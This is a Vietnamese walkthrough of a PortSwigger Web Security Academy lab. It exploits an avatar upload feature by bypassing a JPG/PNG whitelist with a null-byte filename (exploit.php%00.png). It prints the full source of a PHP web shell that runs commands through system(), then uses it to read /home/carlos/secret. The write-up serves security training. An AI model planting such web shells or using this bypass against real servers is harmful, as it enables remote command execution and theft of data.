<img width="1003" height="611" alt="image" src="https://github.com/user-attachments/assets/6377962b-2072-48a2-864a-c414b9f8e472" />

# Tổng Quan

Đầu tiên ta đăng nhập với tài khoản wiener và mật khẩu peter được cấp từ trước

Sau khi đăng nhập,ta thấy có chức năng Upload Avatar có khả năng là File Upload Vuln

Mục tiêu của ta là đọc được nội dung của `/home/carlos/secret`

# Khai thác 
Ta thử upload file `exploit.php` :
```
<html>

<body>
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
        <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
        <input type="SUBMIT" value="Execute">
    </form>
    <pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
   
?>
</pre>
</body>

</html>
```
<img width="1692" height="892" alt="image" src="https://github.com/user-attachments/assets/aa1ec008-8b29-4b76-add5-84a28c961625" />

Trang web có response `Sorry, only JPG & PNG files are allowed Sorry, there was an error uploading your file.` cho ta manh mối là có vẻ như là trang web đang sử dụng whitelist với JPG và PNG extension file

Ta sẽ thử với file `exploit.php.png` nhưng cách này không dùng được vì ta biết được muốn file `exploit.php.png` hoạt động ta cần upload được file `.htaccess` 

Mà ta đã có manh mối là web sử dụng whitelist với JPG và PNG nên ta không thể nào upload được file `.htaccess`

Ta sẽ thử với file `exploit.php%00.png` :
```
<html>

<body>
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
        <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
        <input type="SUBMIT" value="Execute">
    </form>
    <pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
   
?>
</pre>
</body>

</html>
```

<img width="1706" height="972" alt="image" src="https://github.com/user-attachments/assets/4fb4eb48-f7af-450d-8503-a7575b1aec6a" />

Ta đã upload thành công và có chi tiết rất hay đó là tên file có đuôi là `png` tuy nhiên logic xử lí của web khiến cho file bị mất đi đuôi .png và vô tình upload file .php

Lý do cho việc này:</br> 
+ Đầu tiên file `exploit.php.png` có đuôi là `.png` nằm trong whitelist nên pass qua vòng duyệt file </br>
+ Tuy nhiên `%00` null byte sẽ web URL decoding là \0 và sử dụng C-style string và coi \0 là kết thúc chuỗi nên thành ra file `exploit.php` uploaded </br>

Rồi cuối cùng ta truy cập vào file exploit.php:</br>
`https://0aae001204327029810a933900ac0097.web-security-academy.net/files/avatars/exploit.php`</br>
Sau đó ta dùng command linux:
```
cat /home/carlos/secret
```
<img width="1706" height="966" alt="image" src="https://github.com/user-attachments/assets/f9826f6e-02f7-403c-b1d1-5cce9e595fe8" />
</br>
Vậy là ta đã biết được nội dung là `8r8aZ8T4HcNMTnXkD9ke71ehNK6xUbVN`</br>
Việc còn lại của ta là submit và hoàn thành lab</br>
<img width="1706" height="896" alt="image" src="https://github.com/user-attachments/assets/6cbd9cff-aee8-4822-ad41-01d2ac5fc704" />

=>Solved!
